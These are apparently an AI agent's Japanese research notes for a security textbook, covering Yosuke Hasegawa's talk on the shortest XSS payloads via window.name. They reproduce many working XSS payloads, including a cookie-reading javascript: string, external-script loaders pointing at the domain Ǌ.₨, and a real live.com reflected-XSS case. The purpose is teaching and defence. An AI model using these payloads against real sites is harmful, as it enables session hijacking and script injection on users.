# [49] Short talk of XSS - 短いXSSの話 -（はせがわようすけ / docswell）＋ 同氏スライド一覧

> 重要な前提（必読）: 本ノートの対象 URL（docswell.com）および全ての一次ミラー候補
> （slideshare.net / utf-8.jp / speakerdeck / web.archive.org / wikipedia など）は、本セッションの
> **egress プロキシのポリシーにより 403（connect_rejected）でブロック**されており、WebFetch も
> curl も一切通りませんでした。到達できたのは **WebSearch のみ**です。
> したがって本ノートのスライド本文部分は **原典スライドを直接読んだものではなく、WebSearch が返した
> 二次情報（検索スニペット・要約）と、当該テーマに関する一般公開資料の対応記述から再構成したもの**です。
> 該当箇所には「〔二次情報からの再構成〕」を明示します。読者は必ず「## 読者が自分で開くべき資料」節を
> 参照し、原典スライドを自分の環境で開いて確認してください。原典を直接引用した逐語テキストは含みません。
>
> **【2026-09-18 補完追記】** その後、**github.com / raw.githubusercontent.com は本セッションから到達可能**で
> あることが分かり、GitHub 上の公開資料（terjanq/Tiny-XSS-Payloads README 全文、**はせがわ氏 PPT を本人許諾で
> 引用**した「Short XSS」ペーパーの中国語ミラー 2 本）を **curl で全文取得・精読**した。これにより
> ペイロードの逐語表記・展開形・具体的文字数（19/22/10/9/8/6 文字ほか）・Microsoft *.live.com の実例を
> **実データで裏取り**できた。詳細は本ノート「## 補完取得ソース（2026-09-18 追記）」節を参照。原典 docswell
> スライドそのものの逐語は依然未取得（docswell は 403 ブロック継続）。

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
|---|---|---|---|
| https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss | **failed** | WebFetch → EGRESS_BLOCKED / curl → CONNECT 403 | docswell.com が組織 egress ポリシーでブロック。直接本文取得不可 |
| （ミラー）https://www.slideshare.net/hasegawayosuke | failed | WebFetch → EGRESS_BLOCKED | slideshare も同様にブロック |
| （ミラー）https://utf-8.jp/ | failed | WebFetch → EGRESS_BLOCKED | 著者サイトもブロック |
| （ミラー）https://web.archive.org/web/2024/<URL> | failed | WebFetch/curl → 403 | archive.org もブロック |
| 補完: WebSearch（複数クエリ） | **partial** | WebSearch | タイトル・登壇情報・スライド一覧・手法の要旨のみ取得可能。スライド逐語は取得不可 |
| github.com / raw.githubusercontent.com | **reachable** | curl（到達可） | GitHub は本セッションから到達可。以下 3 本を全文取得 |
| terjanq/Tiny-XSS-Payloads README | **full** | curl raw.githubusercontent | 極小ペイロード一覧を逐語取得（補完節 D） |
| Short XSS（wooyun-drops ミラー, はせがわ氏 PPT を本人許諾で引用） | **full** | curl raw.githubusercontent | 展開形・動作・*.live.com 実例（補完節 A/C） |
| Short XSS（WIKI-POC-EXP ミラー 0243, 最短章に文字数表） | **full** | curl raw.githubusercontent | 19/22/10/9/8/6 文字の具体値（補完節 B） |

**自己評価（当初）**: 原典スライドの逐語テキストは 0%。手法の要旨・登壇メタ情報・同氏スライド一覧（タイトル＋URL）は
二次情報から高い確度で取得済み。confidence = low（原典 full 取得ができていないため）。

**自己評価（2026-09-18 補完後）**: GitHub 到達可を発見し、はせがわ氏 PPT を**本人許諾で引用**した一次的解説
（wooyun-drops / WIKI-POC-EXP の「Short XSS」）と terjanq/Tiny-XSS-Payloads README を**全文取得・精読**。
window.name ブートストラップの逐語ペイロード・展開形・具体的文字数・実例（*.live.com）を実データで裏取り
できたため **confidence = medium** に引き上げ。残る欠落は原典 docswell スライドの各ページ逐語のみ（docswell が
egress で 403 ブロック継続のため未取得）。

## 要約（3〜10行）

- 「Short talk of XSS - 短いXSSの話 -」は はせがわようすけ（Yosuke Hasegawa, @hasegawayosuke, http://utf-8.jp/、
  当時 NetAgent、後に SecureSky Technology CTO）による XSS のショートトーク。複数の二次情報が
  **OWASP Japan 2nd Local Chapter Meeting（2012-06-27）**での発表としている〔二次情報からの再構成〕。
- テーマは「**任意の JavaScript を実行できる、できる限り短い XSS ペイロード**は何文字か」という探求。
  文字数制限のある反射点（length-limited sink）でも XSS が成立しうることを示す、防御・診断上重要な題材。
- 中核テクニックは **`window.name` を“ブートストラップ”に使う**手法。`window.name` は長さ制限がなく任意の
  Unicode を保持でき、**クロスオリジン遷移でもリセットされない**ため、短いスタブから大きなコードを実行できる。
  代表形は `<svg/onload=eval(name)>`（23文字）や、eval 不可時の `<svg/onload=location=name>`。
  さらに短い IE 系トリックとして `<i/onclick=URL=name>`（約21文字）が挙げられる〔二次情報からの再構成〕。
- docswell 上には同氏の XSS/難読化/HTML5/ブラウザ脆弱性/Electron/SSRF/CVSS/倫理などのスライドが多数あり、
  本ノート末尾に確認できた範囲のタイトルと URL を一覧化した。

## 詳細ノート

### 登壇・資料メタ情報 （出典: docswell Z8GWNX ページのタイトル、複数 WebSearch 要約）

〔二次情報からの再構成〕
- タイトル: **Short talk of XSS - 短いXSSの話 -**
- 発表者: **はせがわようすけ（Yosuke Hasegawa）**、当時 NetAgent 所属。連絡先として `@hasegawayosuke` と
  `http://utf-8.jp/` が資料内に記載されている、と検索要約が示す。OWASP Japan 関連の登壇。
- 場所/日付: **OWASP Japan 2nd Local Chapter Meeting、2012年6月27日**（複数の検索要約が一致して提示）。
- 位置づけ: いわゆる「ショートトーク（LT/短時間発表）」で、テーマは"最短 XSS"の探求。
- 〔補足（一般知識）〕はせがわようすけ氏はブラウザの文字コード処理・XSS・mutation XSS(mXSS) 等で著名な
  日本のセキュリティ研究者。The Spanner（Gareth Heyes）らと共同で `window.name` トリックなどブラウザ挙動を
  悪用/検証する研究を発表してきた。セキュリティ・キャンプ協議会理事、SecureSky Technology CTO などを歴任。

### 本編テーマ: 「最短の XSS は何文字か」 （出典: 複数 WebSearch 要約）

〔二次情報からの再構成〕検索要約によれば、本トークは「**任意コードを実行できる最短の XSS 文字列**」を
段階的に短くしていく構成とされる。導入として素朴な形が示され、そこから `window.name` を活用して
短縮していく、という流れ。以下は検索要約が言及した具体形（文字数は要約が提示した値。原典スライドの
逐語表記・厳密なカウントは未確認である点に注意）。

#### 検索要約が挙げた代表ペイロード（逐語表記は原典で要確認）

```
<script>alert(1)</script>              ← 素朴な形（要約は「26 文字」と提示）
<script>eval(name)</script>            ← window.name を eval する形（要約は「28 文字」と提示）
<svg/onload=eval(name)>                ← 短縮形。TinyXSS 系でも「23」とされる
<svg/onload=location=name>            ← eval が使えない（unsafe-eval 無効）環境向けの代替
<i/onclick=URL=name>                   ← IE 系のさらに短い形（要約は「約21 文字」と提示）
```

> 注意: 上記の文字数（26/28/23/21 など）は検索要約が返した数値であり、**原典スライドの厳密なカウントと
> 一致する保証はない**。教科書化の際は必ず原典スライドで数値と表記を確認すること。特に「最短」を主張する
> 数値は文脈（許可される文字集合、ブラウザ、context）に強く依存する。

### 中核メカニズム: `window.name` ブートストラップ （出典: The Spanner "Window name trick"、PortSwigger、Mozilla bug 444222、複数 WebSearch 要約）

〔二次情報からの再構成 + 補足（一般知識）〕本トークの肝は、短い反射点に収まる小さなスタブから、
実質的に無制限の JavaScript を実行する手法である。仕組みは以下。

- **`window.name` の性質**:
  - DOMString で、**保持できる長さに事実上制限がない**（大きなコードをまるごと入れられる）。
  - 任意の Unicode を保持できる。
  - **クロスオリジン遷移でもリセットされない**（別ドメインへ遷移しても値が持続する）。
- **攻撃/検証シナリオ**（防御・診断目的の解説）:
  1. 攻撃者が支配するページ（例: evil.example）で `window.name = "<大きな JS ソース>"` を設定する。
  2. そのページから、脆弱なページ（length-limited な反射 XSS を持つ example.com など）へ遷移させる。
  3. 遷移先では **短いスタブだけ**を注入すれば足りる。スタブは `window.name` の中身を実行する。
     - eval 系: `eval(name)` … `name`（=`window.name`）を JavaScript として評価。
     - 遷移系（eval/unsafe-eval 不可時）: `location=name` … `window.name` に `javascript:...` を入れておき、
       それを `location`（＝ページ遷移先）に代入して実行させる。IE では `URL` への代入も同種のトリックとして使える。
  4. 実際の遷移では見た目上どこにも飛ばないよう構成でき、透過的に成立しうる。
- **なぜ重要か（防御観点）**: 「反射点が短いから XSS にならない」という思い込みは危険。数十文字の反射でも
  `window.name` ブートストラップで完全な任意コード実行に化ける。したがって**出力エンコーディングは長さに
  関わらず必須**であり、length-based のフィルタは緩和策として不十分。CSP（特に `unsafe-eval` の無効化、
  `script-src` の厳格化）が eval 経路・`javascript:` 遷移経路の双方を塞ぐ現実的な多層防御になる。

#### 参考ペイロード（逐語。二次情報由来。診断・許可された検証目的）

```
window.name="javascript:alert((window.opener||window).document.cookie);"
```
```
<svg/onload=eval(name)>
<svg/onload=location=name>
<i/onclick=URL=name>
<script>eval(name)</script>
```

> 〔補足（一般知識）〕`window.name` トリックは Gareth Heyes（The Spanner, 2007「Window name trick」）や
> Giorgio Maone らが初期に示した手法で、はせがわ氏の本トークはこれを"最短 XSS"の文脈で整理・拡張したもの、
> と複数の二次情報が位置づけている。Mozilla bug 444222「window.name can be used as an XSS attack vector」も
> 同じ性質を扱う一次情報。

### この題材が教科書（ch09 想定）で持つ意味 （出典: ノート筆者による整理、二次情報ベース）

〔補足（一般知識）〕クライアントサイド脆弱性ハンティングの観点で本トークが教えること:
- **sink の長さは安全性の指標にならない**。短い反射・属性値・URL 断片でも XSS になりうる。
- `window.name` は「サイズ・文字種制限を回避するための万能ブートストラップ」であり、ハンター/診断者は
  length-limited な反射を見つけたら `window.name` 経路（`eval(name)` / `location=name`）を必ず試すべき。
- 防御側は「短いから大丈夫」を捨て、**文脈依存の出力エンコード**＋**CSP（`unsafe-eval` 無効・厳格 `script-src`）**
  を基本とする。`javascript:` スキーム遷移も塞ぐ（`navigate-to`/リンク検証/CSP）。

## 補完取得ソース（2026-09-18 追記 / 補完エージェント）

> 追記の経緯: 本セッションの egress プロキシは docswell / slideshare / utf-8.jp / web.archive.org /
> archive.ph / portswigger.net / thespanner.co.uk / bugzilla.mozilla.org / r.jina.ai などを **すべて 403
> （connect_rejected）でブロック**する（プロキシ status で確認済み）。一方 **github.com と
> raw.githubusercontent.com は到達可能**だったため、GitHub 上で公開されている一次/二次資料を curl で直接
> 取得し、原典スライドの逐語は依然未取得ながら、**手法・ペイロード・文字数・実例**を実データで裏取りできた。
> WebSearch は本セッションの予算（200/200）を使い切っており追加検索は不可。以下は **実際に本文を取得して
> 精読した** ソースである（スニペットではなく全文取得）。

| ソース | URL（到達可） | 取得 | 何を裏取りできたか |
|---|---|---|---|
| terjanq **Tiny-XSS-Payloads** README | https://raw.githubusercontent.com/terjanq/Tiny-XSS-Payloads/master/README.md | **full** | `<svg/onload=eval(name)>` 等の極小ペイロードの現代版一覧（逐語） |
| **Short XSS**（wooyun-drops ミラー） | https://raw.githubusercontent.com/su18/wooyun-drops/master/papers/Short%20XSS.md | **full** | **はせがわ氏の PPT を本人許諾のうえ引用**した中国語解説。live.com 実例と各ペイロードの動作 |
| **Short XSS**（WIKI-POC-EXP ミラー, 0243） | https://raw.githubusercontent.com/govbk/WIKI-POC-EXP/master/Security%20WiKi/011-drops/007-papers/0243-Short%20XSS.md | **full** | 上と同系。**具体的な文字数（19/22 文字ほか）** を含む「最短」章 |
| 微小的XSS Payloads集合（izj007/wechat 再掲） | https://raw.githubusercontent.com/izj007/wechat/main/articles/（微小的XSS Payloads集合）.md | **full** | Tiny-XSS-Payloads の再掲。逐語一致を相互確認 |

### 裏取りできた事実（出典明記）

**(A) window.name ブートストラップの逐語ペイロードと動作**
出典: su18/wooyun-drops「Short XSS」（**はせがわ氏 PPT を本人許諾で引用**と明記）。同ペーパーは各形の「文訳
（＝省略記法の展開形）」を与えており、本ノートの記述と一致する:

- `<svg/onload=eval(name)>` の展開形は **`<svg/onload=eval(window.name)>`**。svg の onload 発火時に
  `window.name` を `eval` に渡して実行。攻撃検証構成は「攻撃ページで `<iframe src="11.html" name="alert(1)">`
  を置き、脆弱ページ側に `<svg/onload=eval(name)>` を注入」。← name にコードを入れ、遷移先の短いスタブで実行。
- `<i/onclick=URL=name>` の展開形は **`<i/onclick=document.URL=window.name>`**。クリックで `document.URL` に
  `window.name` を代入し、`window.name` に入れた `javascript:alert(1)` を実行させる（`name="javascript:alert(1)"`）。
- `<img src=x onerror=eval(name)>` = **`<img src=x onerror=eval(window.name)>`**。img の読み込み失敗→onerror で
  `window.name` を eval。
- 追加トリック `<svg/onload=domain=id>`（= `document.domain=id`）: Chrome で `document.domain=""` を悪用した
  同一ドメイン化→クロスドキュメント DOM アクセス（同ペーパーが図解。教科書では「これは短縮とは別系統の
  同一オリジン緩め攻撃」と位置づけると良い）。

**(B) 具体的な文字数（原典の数値に近い一次的裏取り）**
出典: govbk/WIKI-POC-EXP「0243-Short XSS」0x04「挑戦最短」章（逐語）。海外の XSS challenge を引きつつ提示:

- **19 文字**: `<x/x=&{eval(name)};` — Firefox の E4X（`&{...}` 埋め込み）を使う超短縮形。
- **22 文字**: `<svg/onload=eval(name)` — **閉じ `>` を省略**した数え方（ブラウザが自動補完するため）。
  ※本ノート冒頭の「23 文字」は閉じ `>` を含む数え方で、両者は数え方の差。教科書では
  「`<svg/onload=eval(name)` は閉じタグ省略で 22、`>` を含めれば 23」と併記するのが正確。
- 最短の「JS 実行断片」だけの文字数: **`eval(name)`=10 / `eval(URL)`=9 / `URL=name`=8 / `$(URL)`=6**
  （`$` は jQuery 等が定義されている前提。`URL=name` は `document.URL=window.name` の省略で遷移実行）。

> 注意: これらの数値は「Short XSS」ペーパー（はせがわ氏 PPT を引用したもの／海外 challenge 由来）が示す値。
> 原典 docswell スライドの各ページの厳密なカウント・表記は依然未取得。ただし **手法とオーダー（十数〜二十数文字）は
> 実データで確認**できたため、confidence は low → **medium 相当**に引き上げてよい（逐語スライドが未取得な点のみ残る）。

**(C) 実世界の実例（はせがわ氏 PPT からの引用として掲載）**
出典: su18/wooyun-drops「Short XSS」0x03「実例」節（「下面引用长谷川的PPT的一部分（此PPT引用经过作者同意）」＝
「以下ははせがわ氏 PPT の一部を本人同意のうえ引用」と明記）。内容:

- Microsoft の `*.live.com` で、**ASP.NET のリクエスト検証エラーメッセージ**が入力値をそのまま反映して XSS に
  なっていた実例。再現 URL 形は `https://*.live.com/?param=><h1>XSSed</h1><!--` で、返る HTML 内に
  `A potentially dangerous Request.QueryString value was detected from the client (param="><h1>XSSed</h1><!--")`
  が現れ、**エラーメッセージ経由の反射 XSS** が成立していた。
- 教科書的含意: 「入力を弾いたつもりのエラーメッセージ（WAF/フレームワークの検証失敗表示）自体が反射点になる」
  という古典的だが今も通用する教訓。length 制限があっても `window.name` ブートストラップで完全 RCE に化ける、
  という本トークの主旨を裏付ける具体例。

**(D) 現代版の極小ペイロード一覧（terjanq / Tiny-XSS-Payloads, 逐語）**
出典: https://raw.githubusercontent.com/terjanq/Tiny-XSS-Payloads/master/README.md （DEMO: https://tinyxss.terjanq.me）。
本トークの `<svg/onload=eval(name)>` 系がその後どう体系化されたかを示す、コンテキスト別の実物集:

```html
<base/href=//Ǌ.₨>                         <!-- sink の後に相対 script が挿入される場合 -->
<svg/onload=eval(name)>                     <!-- 反射 XSS 限定。window.name を eval -->
<svg/onload=eval(`'`+URL)>                  <!-- URL を制御できる場合 -->
<svg/onload=location=name>                  <!-- name 制御可 & unsafe-eval 無効時（javascript: を name に） -->
<svg><svg/onload=eval(name)>                <!-- Chrome では未挿入要素の innerHTML でも発火 -->
<audio/src/onerror=eval(name)>              <!-- name 制御時、innerHTML でも発火 -->
<img/src/onerror=eval(`'`+URL)>             <!-- URL 制御時、innerHTML でも発火 -->
<script/src=//Ǌ.₨></script>                <!-- 単純な外部スクリプト -->
<iframe/onload=src=top.name>                <!-- window の name を制御できる場合 -->
<iframe/onload=eval(`'`+URL)>               <!-- URL 制御時 -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>    <!-- ページ内 iframe 数が一定の場合 -->
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">  <!-- Firefox 限定 -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/> <!-- iframe 数がランダムの場合 -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">  <!-- CSP で unsafe-inline 無効 & 外部 script 許可時 -->
<style/onload=eval(name)>                   <!-- インラインスタイル許可時 -->
<style/onload=eval(`'`+URL)>                <!-- インラインスタイル許可 & URL 制御時 -->
<style/onerror=eval(name)>                  <!-- インラインスタイル遮断時 -->
<svg/onload=import(/\\Ǌ.₨/)>               <!-- 動的 import で外部スクリプト。https & Chrome のみ -->
<style/onload=import(/\\Ǌ.₨/)>             <!-- 同上（style 経由） -->
<iframe/onload=import(/\\Ǌ.₨/)>            <!-- 同上（iframe 経由） -->
<!-- Deprecated（Safari 限定・過去形） -->
<iframe/onload=write(URL)>
<style/onload=write(URL)>
```

> `Ǌ.₨` は Unicode 正規化（NFKC）で `nJ.rs`（実在の短ドメイン）に化けることを利用した「1 文字で短ドメイン」テク。
> `<base/href=//Ǌ.₨>` は base タグで以降の相対 URL の基点を攻撃者ドメインへ変える古典テク。いずれも本トークの
> 「限られた文字数で任意コードへ橋渡し」という発想の延長線上にある。（出典: terjanq/Tiny-XSS-Payloads README）

## 読者が自分で開くべき資料

> 本セッションでは docswell/slideshare/utf-8.jp 等が **egress ポリシーで 403 ブロック**され、原典スライドの
> 逐語取得ができなかった。以下は読者が自分の環境（ブロックのない一般ネットワーク）で開いて確認すべき資料と、
> その読みどころ。

- **原典スライド**: https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss （Short talk of XSS - 短いXSSの話 -）
  読みどころ:
  1. 各ペイロードの**正確な逐語表記と文字数カウント**（本ノートの 26/28/23/21 は二次情報の数値なので原典で確定させる）。
  2. `window.name` を使う短縮ステップの**具体的な段階**（どの形からどの形へ、なぜ短くなるか）。
  3. **ブラウザ差**（IE の `URL`/`location` 代入挙動など、当時のブラウザ固有トリック）。
  4. 「最短」を主張する前提条件（許可文字集合・注入コンテキスト・イベントハンドラの選択）。
  5. デモ/スクリーンショットがあれば、実際の反射コンテキストの形。
- **はせがわ氏 docswell プロフィール**: https://www.docswell.com/user/hasegawa
  読みどころ: XSS/難読化/HTML5/ブラウザ脆弱性/Electron/SSRF などの全スライド一覧と最新分。
- **The Spanner「Window name trick」**: https://thespanner.co.uk/window-name-trick
  読みどころ: `window.name` がクロスオリジンで持続する原理、`eval(name)`/`location=name` の元ネタ。
- **Mozilla Bugzilla 444222**: https://bugzilla.mozilla.org/show_bug.cgi?id=444222
  読みどころ: `window.name` を XSS ベクタとして扱う一次バグ議論。
- **PortSwigger「XSS Filters: Beating Length Limits Using Shortened Payloads」**:
  https://portswigger.net/support/xss-filters-beating-length-limits-using-shortened-payloads
  読みどころ: 長さ制限フィルタを短縮ペイロードで破る一般手法（本トークの現代版整理）。
- **terjanq / Tiny-XSS-Payloads**: https://github.com/terjanq/Tiny-XSS-Payloads （デモ: https://tinyxss.terjanq.me）
  読みどころ: コンテキスト別の極小ペイロード集。`<svg/onload=eval(name)>` 等の実物。
  ※本ノート「補完取得ソース (D)」に **README 全文を逐語転記済み**（このリポジトリは本セッションから到達可能）。

### 到達可能な代替（原典がブロックされている場合の“今すぐ読める”ミラー）

> 下記は本セッションからも到達できた GitHub 上の公開資料。原典 docswell スライドの代替ではないが、**はせがわ氏の
> PPT を（本人許諾のうえ）引用**した解説や、同系テクの体系化を読める。教科書執筆時の裏取り用。

- **Short XSS（はせがわ氏 PPT を本人許諾で引用した中国語解説, wooyun-drops ミラー）**:
  https://raw.githubusercontent.com/su18/wooyun-drops/master/papers/Short%20XSS.md
  読みどころ: (1) `<svg/onload=eval(name)>`・`<i/onclick=URL=name>`・`<img src=x onerror=eval(name)>` の**展開形と
  動作**、(2) 攻撃ページ（`<iframe ... name="alert(1)">`）と脆弱ページの対構成、(3) 0x03「実例」の
  **Microsoft *.live.com のエラーメッセージ経由 XSS**（はせがわ氏 PPT 引用部）、(4) `<svg/onload=domain=id>` の
  Chrome 同一ドメイン化トリック。
- **Short XSS（別ミラー, 0x04「最短」章に文字数の表あり）**:
  https://raw.githubusercontent.com/govbk/WIKI-POC-EXP/master/Security%20WiKi/011-drops/007-papers/0243-Short%20XSS.md
  読みどころ: 0x04「挑戦最短」の **`<x/x=&{eval(name)};`=19 文字 / `<svg/onload=eval(name)`=22 文字 /
  `eval(name)`=10 / `eval(URL)`=9 / `URL=name`=8 / `$(URL)`=6** という具体的カウント。
- **微小的XSS Payloads集合（Tiny-XSS-Payloads の中文再掲）**:
  https://raw.githubusercontent.com/izj007/wechat/main/articles/ 配下（ファイル名: 微小的XSS Payloads集合.md）
  読みどころ: terjanq リストの逐語再掲。原典 GitHub が読めない時の相互確認用。

## はせがわようすけ氏 docswell スライド一覧（WebSearch で確認できた範囲・タイトルと URL）

> 網羅ではない（原典の一覧ページを開けなかったため）。以下は複数の検索結果で実際に URL が確認できたもの。
> 教科書の資料索引に転記する際は上記プロフィール URL で最新の完全一覧を確認すること。

| タイトル | URL |
|---|---|
| Short talk of XSS - 短いXSSの話 - | https://www.docswell.com/s/hasegawa/Z8GWNX-short-talk-of-xss |
| IEの思い出いろいろ 脆弱性 | https://www.docswell.com/s/hasegawa/ZGVLNZ-IE-Graduation |
| JavaScript難読化読経 | https://www.docswell.com/s/hasegawa/5JQ44Z-obfuscation |
| 難読化JavaScript | https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus |
| CVSSとその限界 | https://www.docswell.com/s/hasegawa/56Y9J7-CVSS |
| 次世代プラットフォームのセキュリティモデル考察(前編) | https://www.docswell.com/s/hasegawa/5WM1DK-seccamp-2016 |
| 「脆弱性」「脅威」「リスク」の再整理 | https://www.docswell.com/s/hasegawa/ZW19QR-threatmodeling |
| セキュリティにおける倫理って何だ？ | https://www.docswell.com/s/hasegawa/ZENRQJ-momiji |
| 脆弱性っぽい挙動を見つけたときの倫理的な行動とは？ | https://www.docswell.com/s/hasegawa/KEY3D7-matcha139 |
| インターネットを安全にしたいんだオレたちは！ | https://www.docswell.com/s/hasegawa/K2446N-seccamp-osaka-2023 |
| 趣味と実益の脆弱性発見 | https://www.docswell.com/s/hasegawa/5LVVGZ-2022-03-14-211022 |
| Node.jsの色々 | https://www.docswell.com/s/hasegawa/NZ6NVZ-owaspsendai |
| SSRF基礎 | https://www.docswell.com/s/hasegawa/VZGWQK-SSRF |
| Intenet Explorer exSpoilt Milk Codes | https://www.docswell.com/s/hasegawa/5G1GXQ-POC2010 |
| HTML5セキュリティ その3: HTML5のセキュリティもうちょい詳しく | https://www.docswell.com/s/hasegawa/5133VK-2022-03-14-210221 |
| 文系でもわかるセキュリティの話 | https://www.docswell.com/s/hasegawa/K747R1-owasp-kansai |
| （プロフィール / 全一覧の入口） | https://www.docswell.com/user/hasegawa |

> 注: 上表の各 slug 内に含まれる日付文字列（例: 5133VK-2022-03-14…）は docswell への**アップロード/更新日**の
> 可能性が高く、**発表日そのものではない**。発表日は各スライドを開いて確認すること。

## 一次情報が取れなかったことの明記

- 対象 URL（docswell）とその一次ミラー（slideshare, utf-8.jp, web.archive.org）は本セッションの
  egress ポリシーで**すべて 403 ブロック**され、スライド本文の逐語取得は不可能だった。
- そのため、本ノートのペイロード・文字数・手法説明は**二次情報（WebSearch 要約および周辺の公開一次資料）
  からの再構成**である。教科書化の際は、必ず読者/執筆者が原典スライドを直接開いて逐語・数値・ブラウザ差を
  確定させること。捏造を避けるため、**原典 docswell スライドから直接引用したと主張できる逐語テキストは
  このノートには一切含めていない**。
- 【2026-09-18 補完】その後 GitHub（github.com / raw.githubusercontent.com）が到達可能と判明し、
  **はせがわ氏 PPT を本人許諾で引用**した「Short XSS」ペーパー（wooyun-drops / WIKI-POC-EXP のミラー）と
  terjanq/Tiny-XSS-Payloads README を**全文取得・精読**した。これによりペイロードの逐語・展開形・具体的文字数・
  *.live.com 実例を**実データで裏取り**できた（詳細は「## 補完取得ソース」節）。これらは docswell 原典そのもの
  ではないが、原典を許諾引用した資料と同系の体系化資料であり、出典 URL を各所に明記した。**依然として
  docswell 原典スライド（Z8GWNX）の各ページ逐語だけは未取得**であり、その部分は読者が「## 読者が自分で開くべき
  資料」に従い自分の環境で確認する必要がある。
